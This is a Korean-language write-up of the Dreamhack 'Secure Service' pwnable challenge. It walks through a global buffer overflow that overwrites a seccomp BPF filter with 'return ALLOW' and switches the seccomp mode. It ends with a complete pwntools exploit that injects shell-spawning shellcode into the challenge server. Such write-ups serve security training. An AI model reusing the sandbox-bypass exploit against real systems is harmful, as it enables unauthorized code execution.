---
title: "Secure Service writeup"
date: 2026-05-06 23:00:00 +0900
categories: [Wargame, Dreamhack, Pwnable]
tags: [pwn, seccomp, dreamhack]
---

## Analysis

### checksec

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Source Code

```c
int init()
{
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  return setvbuf(stderr, nullptr, 2, 0);
}

__int64 bof()
{
  puts("You chose to bof to attack my system.");
  printf("payload: ");
  return __isoc99_scanf("%278s", &g_buf);
}

int sandbox()
{
  int result; // eax

  if ( prctl(38, 1, 0, 0, 0) == -1 )
    exit(1);
  result = prctl(22, seccomp_mode, &prog);
  if ( result == -1 )
    exit(1);
  return result;
}

.text:0000000000001387 ; Attributes: bp-based frame
.text:0000000000001387
.text:0000000000001387 ; __int64 shellcode(void)
.text:0000000000001387                 public shellcode
.text:0000000000001387 shellcode       proc near               ; CODE XREF: main+CD↓p
.text:0000000000001387
.text:0000000000001387 s               = byte ptr -90h
.text:0000000000001387 var_8           = qword ptr -8
.text:0000000000001387
.text:0000000000001387 ; __unwind {
.text:0000000000001387                 endbr64
.text:000000000000138B                 push    rbp
.text:000000000000138C                 mov     rbp, rsp
.text:000000000000138F                 sub     rsp, 90h
.text:0000000000001396                 mov     rax, fs:28h
.text:000000000000139F                 mov     [rbp+var_8], rax
.text:00000000000013A3                 xor     eax, eax
.text:00000000000013A5                 lea     rax, [rbp+s]
.text:00000000000013AC                 mov     edx, 80h        ; n
.text:00000000000013B1                 mov     esi, 90h        ; c
.text:00000000000013B6                 mov     rdi, rax        ; s
.text:00000000000013B9                 call    _memset
.text:00000000000013BE                 lea     rax, aYouChoseToShel ; "You chose to shellcode to attack my sys"...
.text:00000000000013C5                 mov     rdi, rax        ; s
.text:00000000000013C8                 call    _puts
.text:00000000000013CD                 lea     rax, aShellcode ; "shellcode: "
.text:00000000000013D4                 mov     rdi, rax        ; format
.text:00000000000013D7                 mov     eax, 0
.text:00000000000013DC                 call    _printf
.text:00000000000013E1                 lea     rax, [rbp+s]
.text:00000000000013E8                 mov     edx, 80h        ; nbytes
.text:00000000000013ED                 mov     rsi, rax        ; buf
.text:00000000000013F0                 mov     edi, 0          ; fd
.text:00000000000013F5                 call    _read
.text:00000000000013FA                 mov     eax, 0
.text:00000000000013FF                 call    sandbox
.text:0000000000001404                 lea     rax, [rbp+s]
.text:000000000000140B                 call    rax
.text:000000000000140D                 nop
.text:000000000000140E                 mov     rax, [rbp+var_8]
.text:0000000000001412                 sub     rax, fs:28h
.text:000000000000141B                 jz      short locret_1422
.text:000000000000141D                 call    ___stack_chk_fail

int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(argc, argv, envp);
  memset(s, 0, 0x20u);
  puts("We made a nice \"sandbox\" program :)");
  puts("Feel free to try to attack our service. No one can infiltrate our system :)");
  while ( 1 )
  {
    printf("which method? ");
    __isoc99_scanf("%31s", s);
    if ( !strcmp(s, "bof") )
    {
      bof();
    }
    else if ( !strcmp(s, "shellcode") )
    {
      shellcode();
    }
    else if ( !strcmp(s, "quit") )
    {
      exit(0);
    }
  }
}
```

`shellcode()`는 오류로 디컴파일되지 않는다. 소스 코드를 요약하면, 사용자 입력을 받아 `bof()`, `shellcode()`, `exit(0)` 중 하나를 호출한다. `bof()`는 최대 278바이트를 입력받아 전역 변수 `g_buf`에 쓴다. `shellcode()`는 최대 128바이트의 쉘코드를 입력받은 후 `sandbox()`를 호출하고 쉘코드를 실행한다. `sandbox()`는 `SECCOMP_SET_MODE_STRICT`를 설정한다.

특이한 점은 `SECCOMP_SET_MODE_STRICT`를 사용하면서도 `PR_SET_NO_NEW_PRIVS` 설정을 선행한다는 점이다. 이 설정은 `SECCOMP_SET_MODE_FILTER`일 때만 필요하다. 따라서 모드를 `SECCOMP_SET_MODE_FILTER`로 바꿔야 한다는 것을 예측할 수 있다.

`prog`의 구조체 형태는 다음과 같다.

```c
struct sock_fprog {
    unsigned short      len;    /* Number of BPF instructions */
    struct sock_filter *filter; /* Pointer to array of
                                   BPF instructions */
};
```

전역 변수 `g_buf`와 `prog`가 있는 `.data` 섹션을 확인해보자.

```
.data:0000000000004010                 public prog
.data:0000000000004010 prog            db    3                 ; DATA XREF: sandbox+42↑o
.data:0000000000004011                 db    0
.data:0000000000004012                 db    0
.data:0000000000004013                 db    0
.data:0000000000004014                 db    0
.data:0000000000004015                 db    0
.data:0000000000004016                 db    0
.data:0000000000004017                 db    0
.data:0000000000004018                 dq offset filter
.data:0000000000004018 _data           ends
.data:0000000000004018
...
global:0000000000004080 ; ===========================================================================
global:0000000000004080
global:0000000000004080 ; Segment type: Pure data
global:0000000000004080 ; Segment permissions: Read/Write
global:0000000000004080 global          segment byte public 'DATA' use64
global:0000000000004080                 assume cs:global
global:0000000000004080                 ;org 4080h
global:0000000000004080                 public g_buf
global:0000000000004080 g_buf           db    0                 ; DATA XREF: bof+2B↑o
global:0000000000004081                 db    0
...
global:0000000000004100                 public filter
global:0000000000004100 filter          db  20h                 ; DATA XREF: .data:0000000000004018↑o
global:0000000000004101                 db    0
global:0000000000004102                 db    0
global:0000000000004103                 db    0
global:0000000000004104                 db    4
global:0000000000004105                 db    0
global:0000000000004106                 db    0
global:0000000000004107                 db    0
global:0000000000004108                 db  15h
global:0000000000004109                 db    0
global:000000000000410A                 db    1
global:000000000000410B                 db    0
global:000000000000410C                 db  3Eh ; >
global:000000000000410D                 db    0
global:000000000000410E                 db    0
global:000000000000410F                 db 0C0h
global:0000000000004110                 db    6
global:0000000000004111                 db    0
global:0000000000004112                 db    0
global:0000000000004113                 db    0
global:0000000000004114                 db    0
global:0000000000004115                 db    0
global:0000000000004116                 db    0
global:0000000000004117                 db    0
...
global:0000000000004180                 public seccomp_mode
global:0000000000004180 seccomp_mode    dq 1                    ; DATA XREF: sandbox:loc_1355↑r
global:0000000000004180 global          ends
```

메모리 배치를 주소 기준 오름차순으로 정리하면 `prog` → `g_buf` → `filter` → `seccomp_mode` 순이다. `prog`는 BPF 명령어 3개로 구성되어 있다.

## Vulnerability Analysis

`bof()` 함수는 `g_buf`에 278바이트를 쓸 수 있는데, `g_buf`와 `seccomp_mode` 사이의 거리는 256바이트이므로 `bof()`를 호출하면 `filter`와 `seccomp_mode`를 원하는 값으로 모두 덮어쓸 수 있다.

따라서 공략 순서는 다음과 같다.

1. `bof()`를 호출하여 `filter`를 쉘을 획득할 수 있는 BPF 명령어 3개로 덮는다.
2. `seccomp_mode`를 `2`(`SECCOMP_SET_MODE_FILTER`)로 덮는다.
3. `shellcode()`를 호출하여 쉘을 획득하는 쉘코드를 입력한다.

`filter`는 `return ALLOW`하는 BPF 명령어 3개로 덮어주면 된다. 바이트코드는 `seccomp-tools`로 쉽게 작성할 수 있다.

```
$ echo "return ALLOW" > rule.txt && seccomp-tools asm rule.txt
"\x06\x00\x00\x00\x00\x00\xFF\x7F"
```

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./secure-service")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 8593)

    return r


def main():
    r = conn()

    payload = b"A" * 128
    payload += b"\x06\x00\x00\x00\x00\x00\xFF\x7F" * 3
    payload += b"A" * 104
    payload += p64(2)

    r.sendlineafter(b"which method? ", b"bof")
    r.sendlineafter(b"payload: ", payload)

    shellcode = asm(shellcraft.sh())
    r.sendlineafter(b"which method? ", b"shellcode")
    r.sendlineafter(b"shellcode: ", shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
```